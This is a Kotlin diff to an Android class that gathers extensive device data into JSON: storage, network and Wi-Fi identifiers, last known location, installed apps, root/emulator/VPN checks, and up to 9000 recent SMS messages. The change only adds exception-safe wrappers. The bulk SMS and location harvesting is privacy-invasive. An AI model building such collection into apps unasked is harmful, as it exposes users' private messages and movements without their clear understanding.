@@ -158,19 +158,19 @@ internal class DevicePayloadCollector(
     private val header: JSONObject
 ) {
     fun asJson(): String = JSONObject().apply {
-        put(DeviceField.FILES, collectFiles())
-        put(DeviceField.STORAGE, collectStorage())
-        put(DeviceField.SCREEN, collectScreen())
-        put(DeviceField.GENERAL, collectGeneral())
-        put(DeviceField.LOCALE, collectLocale())
-        put(DeviceField.BASE_INFO, collectBaseInfo())
-        put(DeviceField.IMEI, collectTelephony())
-        put(DeviceField.CAMERA, collectCamera())
-        put(DeviceField.BATTERY, collectBattery())
-        put(DeviceField.NETWORK, collectNetwork())
-        put(DeviceField.LOCATION, collectLocation())
-        put(DeviceField.SMS, collectSms())
-        put(DeviceField.APPS, collectApps())
+        put(DeviceField.FILES, safeObject { collectFiles() })
+        put(DeviceField.STORAGE, safeObject { collectStorage() })
+        put(DeviceField.SCREEN, safeObject { collectScreen() })
+        put(DeviceField.GENERAL, safeObject { collectGeneral() })
+        put(DeviceField.LOCALE, safeObject { collectLocale() })
+        put(DeviceField.BASE_INFO, safeObject { collectBaseInfo() })
+        put(DeviceField.IMEI, safeObject { collectTelephony() })
+        put(DeviceField.CAMERA, safeObject { collectCamera() })
+        put(DeviceField.BATTERY, safeObject { collectBattery() })
+        put(DeviceField.NETWORK, safeObject { collectNetwork() })
+        put(DeviceField.LOCATION, safeObject { collectLocation() })
+        put(DeviceField.SMS, safeArray { collectSms() })
+        put(DeviceField.APPS, safeArray { collectApps() })
     }.toString()
 
     private fun collectFiles() = JSONObject().apply {
@@ -189,14 +189,18 @@ internal class DevicePayloadCollector(
         val memory = safe { context.getSystemService(ActivityManager::class.java)?.let { manager ->
             ActivityManager.MemoryInfo().also(manager::getMemoryInfo)
         } }
-        put(DeviceField.MEMORY_CARD_SIZE, external?.totalBytes ?: 0L)
-        put(DeviceField.MEMORY_CARD_USED, ((external?.totalBytes ?: 0L) - (external?.availableBytes ?: 0L)).coerceAtLeast(0L))
-        put(DeviceField.INTERNAL_STORAGE_USABLE, internal?.availableBytes ?: 0L)
-        put(DeviceField.INTERNAL_STORAGE_TOTAL, internal?.totalBytes ?: 0L)
-        put(DeviceField.EXTERNAL_STORAGE_TOTAL, external?.totalBytes ?: 0L)
-        put(DeviceField.EXTERNAL_STORAGE_AVAILABLE, external?.availableBytes ?: 0L)
-        put(DeviceField.RAM_TOTAL, memory?.totalMem ?: 0L)
-        put(DeviceField.RAM_USABLE, memory?.availMem ?: 0L)
+        val internalAvailable = safe { internal?.availableBytes } ?: 0L
+        val internalTotal = safe { internal?.totalBytes } ?: 0L
+        val externalTotal = safe { external?.totalBytes } ?: 0L
+        val externalAvailable = safe { external?.availableBytes } ?: 0L
+        put(DeviceField.MEMORY_CARD_SIZE, externalTotal)
+        put(DeviceField.MEMORY_CARD_USED, (externalTotal - externalAvailable).coerceAtLeast(0L))
+        put(DeviceField.INTERNAL_STORAGE_USABLE, internalAvailable)
+        put(DeviceField.INTERNAL_STORAGE_TOTAL, internalTotal)
+        put(DeviceField.EXTERNAL_STORAGE_TOTAL, externalTotal)
+        put(DeviceField.EXTERNAL_STORAGE_AVAILABLE, externalAvailable)
+        put(DeviceField.RAM_TOTAL, safe { memory?.totalMem } ?: 0L)
+        put(DeviceField.RAM_USABLE, safe { memory?.availMem } ?: 0L)
         put(DeviceField.APP_TOTAL_MEMORY, Runtime.getRuntime().totalMemory())
         put(DeviceField.APP_MAX_MEMORY, Runtime.getRuntime().maxMemory())
         put(DeviceField.APP_FREE_MEMORY, Runtime.getRuntime().freeMemory())
@@ -222,29 +226,34 @@ internal class DevicePayloadCollector(
     }
 
     private fun collectGeneral(): JSONObject {
-        val facts = context.deviceRequestFacts()
+        val facts = safe { context.deviceRequestFacts() }.orEmpty()
         val developer = safe { Settings.Global.getInt(context.contentResolver, Settings.Global.DEVELOPMENT_SETTINGS_ENABLED, 0) }
         val usbDebug = safe { Settings.Global.getInt(context.contentResolver, Settings.Global.ADB_ENABLED, 0) }
         val mockLocation = safe { Settings.Secure.getInt(context.contentResolver, Settings.Secure.ALLOW_MOCK_LOCATION, 0) }
-        val manager = context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
+        val manager = safe { context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager }
         val vpn = safe {
-            manager.activeNetwork?.let { manager.getNetworkCapabilities(it)?.hasTransport(NetworkCapabilities.TRANSPORT_VPN) } == true
-        }
-        val fingerprint = (Build.FINGERPRINT + Build.MODEL + Build.MANUFACTURER).lowercase(Locale.US)
-        val emulator = listOf("generic", "emulator", "sdk_gphone", "goldfish", "ranchu").any(fingerprint::contains)
-        val rooted = listOf("/system/bin/su", "/system/xbin/su", "/sbin/su", "/system/app/Superuser.apk").any { File(it).exists() }
+            manager?.activeNetwork?.let { manager.getNetworkCapabilities(it)?.hasTransport(NetworkCapabilities.TRANSPORT_VPN) } == true
+        } == true
+        val fingerprint = safe { (Build.FINGERPRINT + Build.MODEL + Build.MANUFACTURER).lowercase(Locale.US) }.orEmpty()
+        val emulator = safe {
+            listOf("generic", "emulator", "sdk_gphone", "goldfish", "ranchu").any(fingerprint::contains)
+        } == true
+        val rooted = safe {
+            listOf("/system/bin/su", "/system/xbin/su", "/sbin/su", "/system/app/Superuser.apk")
+                .any { File(it).exists() }
+        } == true
         return JSONObject().apply {
-            put(DeviceField.PROXY, if (System.getProperty("http.proxyHost").isNullOrBlank()) 0 else 1)
+            put(DeviceField.PROXY, if (safe { System.getProperty("http.proxyHost") }.isNullOrBlank()) 0 else 1)
             put(DeviceField.DEVELOPER_MODE, developer)
             put(DeviceField.USB_DEBUG, usbDebug)
             put(DeviceField.MOCK_LOCATION, mockLocation)
             put(DeviceField.KEYBOARD_TYPE, safe { context.resources.configuration.keyboard })
-            put(DeviceField.CAN_CALL, if (context.packageManager.hasSystemFeature(PackageManager.FEATURE_TELEPHONY)) 1 else 0)
+            put(DeviceField.CAN_CALL, if (safe { context.packageManager.hasSystemFeature(PackageManager.FEATURE_TELEPHONY) } == true) 1 else 0)
             put(DeviceField.SIMULATOR, if (emulator) 1 else 0)
             put(DeviceField.UPTIME, SystemClock.elapsedRealtime())
             put(DeviceField.ROOT, if (rooted) 1 else 0)
             put(DeviceField.LAST_BOOT, System.currentTimeMillis() - SystemClock.elapsedRealtime())
-            put(DeviceField.VPN, if (vpn == true) 1 else 0)
+            put(DeviceField.VPN, if (vpn) 1 else 0)
             put(ApiField.IS_EMULATOR, facts[ApiField.IS_EMULATOR] ?: "0")
             put(ApiField.IS_VPN, facts[ApiField.IS_VPN] ?: "0")
             put(ApiField.IS_ROOT, facts[ApiField.IS_ROOT] ?: "0")
@@ -253,13 +262,13 @@ internal class DevicePayloadCollector(
 
     private fun collectLocale() = JSONObject().apply {
         val locale = Locale.getDefault()
-        val telephony = context.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
+        val telephony = safe { context.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager }
         put(DeviceField.LANGUAGE, locale.language)
         put(DeviceField.TIME_ZONE, TimeZone.getDefault().id)
         put(DeviceField.DISPLAY_LANGUAGE, locale.displayLanguage)
-        put(DeviceField.OPERATOR_NAME, safe { telephony.networkOperatorName }.orEmpty())
+        put(DeviceField.OPERATOR_NAME, safe { telephony?.networkOperatorName }.orEmpty())
         put(DeviceField.ISO3_COUNTRY, safe { locale.getISO3Country() }.orEmpty())
-        put(DeviceField.SIM_COUNTRY, safe { telephony.simCountryIso }.orEmpty())
+        put(DeviceField.SIM_COUNTRY, safe { telephony?.simCountryIso }.orEmpty())
         put(DeviceField.ISO3_LANGUAGE, safe { locale.getISO3Language() }.orEmpty())
     }
 
@@ -269,7 +278,6 @@ internal class DevicePayloadCollector(
             val key = headerKeys.next()
             put(key, header.opt(key))
         }
-        val telephony = context.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
         val metrics = DisplayMetrics()
         safe {
             @Suppress("DEPRECATION")
@@ -282,7 +290,7 @@ internal class DevicePayloadCollector(
         put(DeviceField.SERIAL_NUMBER, "unknown")
         put(DeviceField.BUILD_TIME, Build.TIME)
         put(DeviceField.ANDROID_ID, safe { Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID) }.orEmpty())
-        put(DeviceField.PHONE_TYPE, safe { telephony.phoneType })
+        put(DeviceField.PHONE_TYPE, safe { context.getSystemService(TelephonyManager::class.java)?.phoneType })
         put(DeviceField.BRAND, Build.BRAND.orEmpty())
         put(DeviceField.MANUFACTURER, Build.MANUFACTURER.orEmpty())
         put(DeviceField.MODEL, Build.MODEL.orEmpty())
@@ -315,11 +323,11 @@ internal class DevicePayloadCollector(
         val intent = safe {
             context.registerReceiver(null, android.content.IntentFilter(android.content.Intent.ACTION_BATTERY_CHANGED))
         }
-        val level = intent?.getIntExtra(BatteryManager.EXTRA_LEVEL, 0) ?: 0
-        val scale = intent?.getIntExtra(BatteryManager.EXTRA_SCALE, 100)?.coerceAtLeast(1) ?: 100
-        val status = intent?.getIntExtra(BatteryManager.EXTRA_STATUS, BatteryManager.BATTERY_STATUS_UNKNOWN)
+        val level = safe { intent?.getIntExtra(BatteryManager.EXTRA_LEVEL, 0) } ?: 0
+        val scale = (safe { intent?.getIntExtra(BatteryManager.EXTRA_SCALE, 100) } ?: 100).coerceAtLeast(1)
+        val status = safe { intent?.getIntExtra(BatteryManager.EXTRA_STATUS, BatteryManager.BATTERY_STATUS_UNKNOWN) }
             ?: BatteryManager.BATTERY_STATUS_UNKNOWN
-        val plugged = intent?.getIntExtra(BatteryManager.EXTRA_PLUGGED, 0) ?: 0
+        val plugged = safe { intent?.getIntExtra(BatteryManager.EXTRA_PLUGGED, 0) } ?: 0
         return JSONObject().apply {
             put(DeviceField.BATTERY_MAX, "")
             put(DeviceField.BATTERY_STATE, status)
@@ -332,32 +340,36 @@ internal class DevicePayloadCollector(
     }
 
     private fun collectNetwork(): JSONObject {
-        val connectivity = context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
-        val network = safe { connectivity.activeNetwork }
-        val capabilities = safe { network?.let(connectivity::getNetworkCapabilities) }
-        val wifi = context.getSystemService(Context.WIFI_SERVICE) as WifiManager
-        val wifiInfo = safe { wifi.connectionInfo }
-        val link = safe { network?.let(connectivity::getLinkProperties) }
-        val networkType = when {
-            capabilities?.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) == true -> "Wi-Fi"
-            capabilities?.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) == true -> "Mobile"
-            capabilities?.hasTransport(NetworkCapabilities.TRANSPORT_ETHERNET) == true -> "Ethernet"
-            else -> "Unknown"
-        }
+        val connectivity = safe { context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager }
+        val network = safe { connectivity?.activeNetwork }
+        val capabilities = safe { network?.let { connectivity?.getNetworkCapabilities(it) } }
+        val wifi = safe { context.getSystemService(Context.WIFI_SERVICE) as WifiManager }
+        val wifiInfo = safe { wifi?.connectionInfo }
+        val link = safe { network?.let { connectivity?.getLinkProperties(it) } }
+        val networkType = safe {
+            when {
+                capabilities?.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) == true -> "Wi-Fi"
+                capabilities?.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) == true -> "Mobile"
+                capabilities?.hasTransport(NetworkCapabilities.TRANSPORT_ETHERNET) == true -> "Ethernet"
+                else -> "Unknown"
+            }
+        } ?: "Unknown"
         val currentWifi = JSONObject().apply {
-            put(DeviceField.BSSID, wifiInfo?.bssid.orEmpty())
-            put(DeviceField.SSID, wifiInfo?.ssid.orEmpty())
+            put(DeviceField.BSSID, safe { wifiInfo?.bssid }.orEmpty())
+            put(DeviceField.SSID, safe { wifiInfo?.ssid }.orEmpty())
         }
         return JSONObject().apply {
             put(DeviceField.NETWORK_TYPE, networkType)
             put(DeviceField.MAC, "")
-            put(DeviceField.IP, link?.linkAddresses?.firstOrNull()?.address?.hostAddress.orEmpty())
+            put(DeviceField.IP, safe { link?.linkAddresses?.firstOrNull()?.address?.hostAddress }.orEmpty())
             put(DeviceField.CURRENT_WIFI, currentWifi)
         }
     }
 
     private fun collectLocation(): JSONObject {
-        val allowed = context.checkSelfPermission(Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED
+        val allowed = safe {
+            context.checkSelfPermission(Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED
+        } == true
         val location = if (allowed) safe {
             val manager = context.getSystemService(Context.LOCATION_SERVICE) as LocationManager
             manager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
@@ -372,17 +384,17 @@ internal class DevicePayloadCollector(
             put(DeviceField.SUB_ADMIN_AREA, "")
         }
         return JSONObject().apply {
-            put(DeviceField.TIME, location?.time ?: 0L)
+            put(DeviceField.TIME, safe { location?.time } ?: 0L)
             put(DeviceField.ADDRESS_OBJECT, address)
-            put(DeviceField.LATITUDE, location?.latitude?.toString().orEmpty())
-            put(DeviceField.LONGITUDE, location?.longitude?.toString().orEmpty())
+            put(DeviceField.LATITUDE, safe { location?.latitude?.toString() }.orEmpty())
+            put(DeviceField.LONGITUDE, safe { location?.longitude?.toString() }.orEmpty())
             put(DeviceField.ADDRESS, "")
-            put(DeviceField.ACCURACY, location?.accuracy?.toString().orEmpty())
+            put(DeviceField.ACCURACY, safe { location?.accuracy?.toString() }.orEmpty())
         }
     }
 
     private fun collectSms(): JSONArray {
-        if (context.checkSelfPermission(Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) return JSONArray()
+        if (safe { context.checkSelfPermission(Manifest.permission.READ_SMS) } != PackageManager.PERMISSION_GRANTED) return JSONArray()
         val cutoff = System.currentTimeMillis() - 180L * 24 * 60 * 60 * 1000
         val fields = arrayOf(
             Telephony.Sms._ID, Telephony.Sms.ADDRESS, Telephony.Sms.DATE, Telephony.Sms.DATE_SENT,
@@ -400,8 +412,9 @@ internal class DevicePayloadCollector(
                 "${Telephony.Sms.DATE} DESC LIMIT 9000"
             )?.use { cursor ->
                 fun value(column: String): String {
-                    val index = cursor.getColumnIndex(column)
-                    return if (index >= 0 && !cursor.isNull(index)) cursor.getString(index).orEmpty() else ""
+                    val index = safe { cursor.getColumnIndex(column) } ?: -1
+                    return safe { if (index >= 0 && !cursor.isNull(index)) cursor.getString(index).orEmpty() else "" }
+                        .orEmpty()
                 }
                 while (cursor.moveToNext() && rows.length() < 9000) {
                     rows.put(JSONObject().apply {
@@ -450,6 +463,10 @@ internal class DevicePayloadCollector(
             }
         }
     }
+
+    private fun safeObject(block: () -> JSONObject): JSONObject = safe(block) ?: JSONObject()
+
+    private fun safeArray(block: () -> JSONArray): JSONArray = safe(block) ?: JSONArray()
 
     private inline fun <T> safe(block: () -> T): T? = try { block() } catch (_: Exception) { null }
 }
